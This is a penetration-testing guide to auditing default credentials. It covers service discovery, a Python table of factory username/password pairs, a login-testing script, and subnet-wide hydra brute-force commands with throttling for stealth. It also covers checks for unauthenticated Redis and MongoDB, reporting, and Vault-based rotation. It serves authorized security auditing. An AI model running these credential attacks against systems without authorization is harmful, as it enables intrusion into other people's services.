# Default Credential Audit Guide

## Introduction

Default credentials remain one of the most exploited attack vectors in penetration testing and security assessments. Administrators frequently deploy services without changing factory credentials, creating easy entry points that require no technical skill to exploit. According to multiple breach reports, default credentials are involved in 15-20% of all data breaches involving external attackers.

This guide covers methodology for auditing default credentials across network services, web applications, and IoT devices. It includes service identification, credential database management, automated testing, and comprehensive reporting.

**Why default credentials persist:**
- Rapid deployment timelines skip security hardening steps
- Development environments promoted to production without credential rotation
- Embedded and IoT devices ship with fixed credentials that cannot be changed
- Documentation often does not emphasize credential changes as a mandatory step
- Automated deployment scripts include default credentials as placeholders

## Practical Steps

### 1. Service Identification

```bash
# Identify services that commonly use default credentials
nmap -sV -p 22,80,443,3306,5432,8080,8443,8880,9090,5900,3389,23,21 \
  --script banner 10.0.0.0/24 -oX services.xml

# Extract service versions for credential lookup
nmap -sV --script http-title -p 80,443,8080 10.0.0.0/24 | \
  grep -E "http-title|open" | paste - -
```

**Service-to-port mapping for quick identification:**

| Port | Service | Default Credential Risk |
|------|---------|------------------------|
| 22 | SSH | High -- root/root, ubuntu/ubuntu |
| 21 | FTP | High -- anonymous access, admin/admin |
| 23 | Telnet | Critical -- often no auth on embedded devices |
| 80/443 | Web servers | Medium -- admin panels, CMS |
| 3306 | MySQL | High -- root/(empty), root/root |
| 5432 | PostgreSQL | High -- postgres/postgres |
| 6379 | Redis | Critical -- no auth by default |
| 8080/8443 | App servers | High -- Tomcat, Jenkins, WildFly |
| 27017 | MongoDB | Critical -- no auth by default |
| 9200 | Elasticsearch | High -- no auth by default |
| 3389 | RDP | High -- administrator/Password1 |

### 2. Default Credential Database

```python
# Common default credential pairs by service
DEFAULT_CREDS = {
    # Databases
    "mysql": [("root", ""), ("root", "root"), ("root", "mysql"), ("admin", "admin")],
    "postgresql": [("postgres", "postgres"), ("postgres", "password")],
    "mongodb": [("admin", "admin"), ("root", "root"), ("mongo", "mongo")],
    "mssql": [("sa", ""), ("sa", "sa"), ("sa", "Password1")],

    # Web interfaces
    "tomcat": [("admin", "admin"), ("tomcat", "tomcat"), ("admin", "tomcat")],
    "jenkins": [("admin", "admin"), ("admin", "password")],
    "phpmyadmin": [("root", ""), ("admin", "admin"), ("pma", "pma")],
    "wordpress": [("admin", "admin"), ("admin", "password")],

    # Network devices
    "cisco": [("admin", "admin"), ("cisco", "cisco"), ("enable", "cisco")],
    "router": [("admin", "admin"), ("admin", "password"), ("root", "root")],
    "printer": [("admin", "admin"), ("admin", ""), ("root", "")],

    # IoT devices
    "ipcamera": [("admin", "admin"), ("admin", "12345"), ("root", "root")],
    "nas": [("admin", "admin"), ("admin", "password")],

    # Remote access
    "ssh": [("root", "root"), ("admin", "admin"), ("ubuntu", "ubuntu")],
    "rdp": [("administrator", "Password1"), ("admin", "admin")],
    "vnc": [("", "password"), ("admin", "admin")],
    "ftp": [("anonymous", "anonymous@"), ("ftp", "ftp@")],
}
```

**Maintaining the credential database:**

```bash
# Update from SecLists repository
git -C /usr/share/seclists pull

# Add vendor-specific defaults from CIRT.net
curl -s "https://cirt.net/passwords" | \
  grep -oP '<td>[^<]+</td><td>[^<]+</td><td>[^<]+</td>' | \
  sed 's/<[^>]*>//g' >> custom_defaults.txt

# Build vendor-specific wordlists for targeted audits
grep -i "cisco" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv > cisco_defaults.csv
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv > tomcat_defaults.csv
```

### 3. Automated Credential Testing

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def test_web_login(url, username, password, login_endpoint="/login"):
    """Test a web login endpoint with credentials."""
    session = requests.Session()
    try:
        resp = session.post(f"{url}{login_endpoint}", data={
            "username": username,
            "password": password,
        }, timeout=10, allow_redirects=True)
        success_indicators = ["dashboard", "welcome", "logout", "admin"]
        return any(ind in resp.text.lower() for ind in success_indicators) and resp.status_code == 200
    except Exception:
        return False

def audit_target(url, service_type):
    """Test all default credentials for a service."""
    creds = DEFAULT_CREDS.get(service_type, [])
    results = []
    for username, password in creds:
        if test_web_login(url, username, password):
            results.append({"url": url, "username": username, "password": password})
    return results
```

**Advanced testing with form detection:**

```python
def auto_detect_login_form(html_content):
    """Auto-detect login form fields from HTML."""
    import re
    forms = re.findall(r'<form[^>]*>(.*?)</form>', html_content, re.DOTALL)
    for form in forms:
        # Detect username and password field names
        user_field = re.search(r'name=["\']([^"\']*(?:user|email|login|name)[^"\']*)["\']', form, re.IGNORECASE)
        pass_field = re.search(r'name=["\']([^"\']*(?:pass|pwd|token)[^"\']*)["\']', form, re.IGNORECASE)
        if user_field and pass_field:
            return {
                "username_field": user_field.group(1),
                "password_field": pass_field.group(1),
            }
    return {"username_field": "username", "password_field": "password"}
```

### 4. Network Service Credential Testing

```bash
# SSH default credential testing
hydra -L users.txt -P defaults.txt -t 4 -f ssh://10.0.0.1

# FTP anonymous access check
curl -s -u "anonymous:anonymous@" ftp://10.0.0.1/

# SNMP default community strings
onesixtyone 10.0.0.1 -c community.txt

# MySQL default credentials
mysql -h 10.0.0.1 -u root -p'' -e "SELECT 1" 2>/dev/null && echo "DEFAULT CREDS: root/empty"

# Redis unauthenticated access check
redis-cli -h 10.0.0.1 ping 2>/dev/null && echo "REDIS: No auth required"

# MongoDB unauthenticated access check
mongo --host 10.0.0.1 --eval "db.adminCommand('listDatabases')" 2>/dev/null && echo "MONGODB: No auth required"
```

**Mass network credential auditing:**

```bash
# Scan entire subnet for services with default credentials
# Step 1: Discover services
nmap -sV -p 22,21,23,3306,5432,6379,27017,8080,9200 -oG services.gnmap 10.0.0.0/24

# Step 2: Extract targets by service
grep "22/open" services.gnmap | awk '{print $2}' > ssh_targets.txt
grep "3306/open" services.gnmap | awk '{print $2}' > mysql_targets.txt
grep "6379/open" services.gnmap | awk '{print $2}' > redis_targets.txt

# Step 3: Run credential tests in parallel
hydra -C defaults.txt -M ssh_targets.txt ssh -t 2 -o ssh_results.txt &
hydra -l root -P mysql_defaults.txt -M mysql_targets.txt mysql -t 2 -o mysql_results.txt &

# Step 4: Test no-auth services
for ip in $(cat redis_targets.txt); do
  redis-cli -h "$ip" ping 2>/dev/null | grep -q PONG && echo "REDIS NO AUTH: $ip"
done
```

### 5. Reporting Template

```python
def generate_credential_report(findings):
    """Generate credential audit report."""
    report = {
        "summary": {
            "total_targets": len(set(f["url"] for f in findings)),
            "total_default_creds_found": len(findings),
            "critical": [f for f in findings if f.get("service") in ("ssh", "rdp", "database")],
        },
        "findings": findings,
        "recommendations": [
            "Change all default credentials immediately",
            "Implement password policies requiring strong passwords",
            "Enable multi-factor authentication where supported",
            "Disable unnecessary services and default accounts",
            "Conduct regular credential audits",
        ],
    }
    return report
```

**Risk classification for findings:**

| Service Category | Default Credential Impact | Severity |
|-----------------|--------------------------|----------|
| Remote access (SSH, RDP, VNC) | Full system compromise | Critical |
| Database (MySQL, PostgreSQL, MongoDB) | Data exfiltration, modification | Critical |
| Web admin (Tomcat, Jenkins, Grafana) | Application compromise, RCE | High |
| Network devices (routers, switches) | Network infrastructure control | Critical |
| IoT (cameras, printers, NAS) | Device compromise, lateral movement | High |
| No-auth services (Redis, Elasticsearch) | Data access, potential RCE | Critical |

## Hands-on Exercises

1. **Exercise 1**: Set up a lab environment with Docker containers running Tomcat, Jenkins, MySQL, and Redis with default configurations. Use the automated credential testing scripts to identify all default credentials and document the findings
2. **Exercise 2**: Build a custom default credential database for a specific vendor (e.g., Cisco routers). Include at least 20 credential pairs and test them against a lab target
3. **Exercise 3**: Create an end-to-end audit pipeline that discovers services on a network segment, identifies service types, matches them to the default credential database, and generates a formatted report with risk classifications

## Credential Rotation Policy

After discovering default credentials, implementing a rotation policy prevents regression:

**Rotation policy checklist:**
- Change credentials immediately upon deployment
- Document all credential changes in a secure vault
- Set rotation intervals: 90 days for service accounts, 180 days for human accounts
- Use different credentials per environment (dev, staging, production)
- Disable accounts that have not been used in 90 days
- Require passwords that differ from the last 12 passwords
- Implement automated rotation for service accounts using secrets management tools

**Automated credential rotation with HashiCorp Vault:**

```bash
# Enable database secrets engine for automated rotation
vault secrets enable database

# Configure MySQL credential rotation
vault write database/config/mysql \
  plugin_name=mysql-database-plugin \
  connection_url="{{username}}:{{password}}@tcp(localhost:3306)/" \
  allowed_roles="readonly,readwrite" \
  username="root" \
  password="current-root-password"

# Create a role with automatic rotation (30-day TTL)
vault write database/roles/readwrite \
  db_name=mysql \
  creation_statements="CREATE USER '{{name}}'@'%' IDENTIFIED BY '{{password}}'; GRANT SELECT, INSERT, UPDATE ON *.* TO '{{name}}'@'%';" \
  default_ttl="720h" \
  max_ttl="2160h"

# Retrieve dynamically generated credentials
vault read database/creds/readwrite
# Output: username=v-token-readwrite-abc123 password=generated-password
```

## False Positive Prevention

Credential testing generates many false positives. Validating findings before reporting saves time and maintains credibility:

**Common false positive scenarios:**

| Scenario | Symptom | Verification Method |
|----------|---------|-------------------|
| Honeypot | All credentials accepted | Test with nonsense credentials (x:y) |
| Generic error page | 200 on all requests | Check response body for "invalid" / "denied" |
| Captcha after failures | First attempt succeeds | Try same credential twice |
| IP-based lockout | Works from one IP only | Test from a second source IP |
| Redirect to login | 302 response on POST | Follow redirect and check final page |
| Rate limiting | First 5 work, rest fail | Wait 5 minutes and retry |

**Validation checklist:**

```bash
# 1. Verify the credential actually grants meaningful access
curl -s -u "admin:admin" "http://target:8080/manager/html" | \
  grep -qi "deploy\|application\|manager" && \
  echo "CONFIRMED: Admin panel accessible" || \
  echo "FALSE POSITIVE: Got 200 but no admin content"

# 2. Test that incorrect credentials are rejected
curl -s -u "admin:wrongpassword" "http://target:8080/manager/html" -o /dev/null -w "%{http_code}"
# Should return 401 or 403, not 200

# 3. Verify from a different source (in case of IP-based behavior)
# Use a proxy or different machine to re-test

# 4. Check for honeypot indicators
for cred in "admin:admin" "root:root" "x:y" "fake:notreal"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -u "$cred" "http://target:8080/")
  echo "$cred -> $status"
done
# If ALL return 200, likely a honeypot
```

## Credential Auditing Best Practices

**Throttling and stealth:**

```bash
# Hydra with rate limiting (avoid account lockout)
hydra -l admin -P wordlist.txt -t 1 -W 5 ssh://target.com
# -t 1: One parallel task
# -W 5: Wait 5 seconds between attempts

# Distribute credential testing across time
# For large networks, use a queue with delays
for target in $(cat targets.txt); do
  hydra -C defaults.txt "$target" ssh -t 1 -W 3 -o "results_${target}.txt"
  sleep 10  # Pause between targets
done
```

**Documentation and evidence preservation:**

```bash
# Capture evidence with timestamps
echo "=== Credential Audit: $(date -Iseconds) ===" >> audit_evidence.txt
echo "Target: $TARGET" >> audit_evidence.txt
echo "Service: $SERVICE" >> audit_evidence.txt
echo "Finding: Default credential $USER:$PASS grants access" >> audit_evidence.txt
echo "Evidence:" >> audit_evidence.txt
curl -s -u "$USER:$PASS" "http://$TARGET/" >> audit_evidence.txt
echo "---" >> audit_evidence.txt
```

## References

- [Default Password Database (CIRT.net)](https://cirt.net/passwords)
- [SecLists -- Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST SP 800-63 -- Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
